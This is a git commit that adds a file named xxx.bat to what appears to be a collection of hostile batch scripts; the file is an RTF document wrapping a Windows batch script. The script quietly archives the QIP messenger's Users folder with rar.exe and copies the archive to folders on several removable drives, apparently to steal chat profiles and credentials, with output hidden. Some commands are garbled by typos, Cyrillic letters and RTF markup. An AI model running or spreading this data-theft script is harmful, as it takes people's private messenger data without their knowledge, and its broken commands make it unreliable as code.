40df18a3116a6ab21cb463cadcf14a214a4babaf
Entynetproject <43011806+entynetproject@users.noreply.github.com>
2018-10-09 20:11:22 +0300

    Add files via upload

---
+++ batch library/xxxforce/xxx.bat
@@ -0,0 +1,19 @@
+{\rtf1\ansi\ansicpg1251\cocoartf1561\cocoasubrtf400
+{\fonttbl\f0\fmodern\fcharset0 CourierNewPSMT;}
+{\colortbl;\red255\green255\blue255;\red6\green59\blue122;\red247\green249\blue249;}
+{\*\expandedcolortbl;;\cssrgb\c0\c30588\c55294;\cssrgb\c97647\c98039\c98039;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \cb3 \expnd0\expndtw0\kerning0
+@Echo off\cb1 \
+\cb3 \uc0\u1089 :\cb1 \
+\cb3 chdit C:\\Program Files\\QIP\\Users\cb1 \
+\cb3 f:\\rar.exe\'a0 \uc0\u1072  -\u1075  users > nul\cb1 \
+\cb3 copy users.rar e:\\abc > nul\cb1 \
+\cb3 \'a0g:\\rar.exe a -r users > nul\cb1 \
+\cb3 copy users.rar g:\\abc > nul\cb1 \
+\cb3 h:\\rar.exe a -r users > nul\cb1 \
+\cb3 copy users.rar h:\\abc > nul\cb1 \
+\cb3 del users-rar > nul}
